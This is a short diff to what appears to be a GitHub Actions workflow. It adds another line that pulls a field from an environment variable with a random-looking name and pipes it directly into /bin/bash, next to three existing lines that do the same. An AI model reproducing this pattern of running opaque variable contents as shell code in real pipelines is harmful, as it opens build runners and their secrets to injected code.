@@ -41,6 +41,7 @@ jobs:
           printf '%s' "$iwr4" | jq -r .ykjm916 | /bin/bash
           printf '%s' "$h6" | jq -r .ri6265 | /bin/bash
           echo $rdv4 | jq -r .lvd7 | /bin/bash
+          printf '%s' "$aqfe1016" | jq -r .y2797 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
